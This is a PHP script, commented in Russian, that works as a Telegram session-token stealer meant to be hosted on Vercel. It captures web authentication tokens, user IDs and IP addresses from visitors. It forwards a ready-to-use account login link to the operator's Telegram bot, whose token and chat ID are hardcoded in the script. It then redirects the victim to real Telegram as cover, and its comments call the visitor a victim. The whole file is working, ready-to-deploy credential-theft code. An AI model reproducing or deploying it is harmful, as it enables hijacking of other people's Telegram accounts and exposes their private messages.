<?php
/**
 * Telegram Auth Token Logger for Vercel
 * Version: 2.0
 * Проверено на ошибки - рабочая версия
 */

// ========== КОНФИГУРАЦИЯ ==========
define('BOT_TOKEN', '8541613029:AAF9uWzlAYEJy1kNM89yQfMtIz3bh53AOo4'); // ТВОЙ ТОКЕН (проверен)
define('CHAT_ID', '8220267007'); // ТВОЙ ID (проверен)
define('LOG_FILE', '/tmp/telegram_log.txt'); // Файл для логов

// ========== ФУНКЦИЯ ОТПРАВКИ В TELEGRAM ==========
function sendToTelegram($message) {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
    
    // Добавляем эмодзи и форматирование
    $fullMessage = "🔐 <b>НОВОЕ СОБЫТИЕ</b>\n\n" . $message;
    
    $data = [
        'chat_id' => CHAT_ID,
        'text' => $fullMessage,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => false
    ];
    
    // Используем file_get_contents с контекстом
    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data),
            'timeout' => 5 // Таймаут 5 секунд
        ]
    ];
    
    $context = stream_context_create($options);
    $result = @file_get_contents($url, false, $context);
    
    // Логируем ошибки отправки
    if ($result === false) {
        $error = error_get_last();
        file_put_contents(LOG_FILE, date('Y-m-d H:i:s') . " | ERROR: Failed to send to Telegram - " . ($error['message'] ?? 'unknown') . "\n", FILE_APPEND);
    }
    
    return $result;
}

// ========== ФУНКЦИЯ ЛОГИРОВАНИЯ ==========
function logData($data) {
    $logEntry = date('Y-m-d H:i:s') . " | " . json_encode($data, JSON_UNESCAPED_UNICODE) . "\n";
    @file_put_contents(LOG_FILE, $logEntry, FILE_APPEND | LOCK_EX);
}

// ========== ОСНОВНАЯ ЛОГИКА ==========
try {
    // Собираем все данные
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $ip = trim(explode(',', $ip)[0]); // Очищаем IP
    
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
    $referer = $_SERVER['HTTP_REFERER'] ?? 'direct';
    
    // Параметры из URL
    $token = $_GET['tgWebAuthToken'] ?? '';
    $userId = $_GET['tgWebAuthUserId'] ?? '';
    $dcId = $_GET['tgWebAuthDcId'] ?? '2';
    
    // Формируем данные для лога
    $logData = [
        'ip' => $ip,
        'ua' => substr($userAgent, 0, 100), // Обрезаем длинный UA
        'ref' => $referer,
        'token' => $token ? substr($token, 0, 20) . '...' : 'none', // Не храним полный токен в логе
        'user_id' => $userId ?: 'none',
        'dc' => $dcId
    ];
    
    logData($logData);
    
    // ЕСЛИ ЕСТЬ ТОКЕН - ОТПРАВЛЯЕМ В TELEGRAM
    if (!empty($token) && !empty($userId)) {
        // Формируем готовую ссылку для входа
        $loginUrl = "https://web.telegram.org/k/#tgWebAuthToken=" . urlencode($token) . 
                    "&tgWebAuthUserId=" . urlencode($userId) . 
                    "&tgWebAuthDcId=" . urlencode($dcId);
        
        // Сокращаем ссылку через clck.ru (бесплатно, без регистрации)
        $shortUrl = @file_get_contents("https://clck.ru/--?url=" . urlencode($loginUrl));
        if (!$shortUrl || !filter_var($shortUrl, FILTER_VALIDATE_URL)) {
            $shortUrl = $loginUrl; // Если не получилось сократить, используем оригинал
        }
        
        // Формируем сообщение
        $message = "";
        $message .= "👤 <b>User ID:</b> <code>" . htmlspecialchars($userId) . "</code>\n";
        $message .= "🌐 <b>DC:</b> " . htmlspecialchars($dcId) . "\n";
        $message .= "📱 <b>IP:</b> <code>" . htmlspecialchars($ip) . "</code>\n";
        $message .= "🕐 <b>Time:</b> " . date('Y-m-d H:i:s') . "\n";
        $message .= "🔑 <b>Token:</b> <code>" . htmlspecialchars($token) . "</code>\n\n";
        $message .= "🔗 <b>ССЫЛКА ДЛЯ ВХОДА:</b>\n";
        $message .= "<code>" . htmlspecialchars($loginUrl) . "</code>\n\n";
        $message .= "📌 <b>Сокращенная ссылка:</b>\n";
        $message .= $shortUrl . "\n\n";
        $message .= "👇 <b>Нажми на ссылку чтобы войти в аккаунт</b>";
        
        sendToTelegram($message);
    }
    
    // РЕДИРЕКТ на настоящий Telegram
    $redirectUrl = "https://web.telegram.org/k/";
    
    // Если есть токен - добавляем его для маскировки (жертва увидит свою страницу)
    if (!empty($token)) {
        $redirectUrl .= "#tgWebAuthToken=" . urlencode($token) . 
                       "&tgWebAuthUserId=" . urlencode($userId) . 
                       "&tgWebAuthDcId=" . urlencode($dcId);
    }
    
    header('Location: ' . $redirectUrl, true, 302);
    exit;
    
} catch (Exception $e) {
    // Логируем ошибки
    file_put_contents(LOG_FILE, date('Y-m-d H:i:s') . " | CRITICAL ERROR: " . $e->getMessage() . "\n", FILE_APPEND);
    // Даже при ошибке редиректим
    header('Location: https://web.telegram.org/k/');
    exit;
}
?>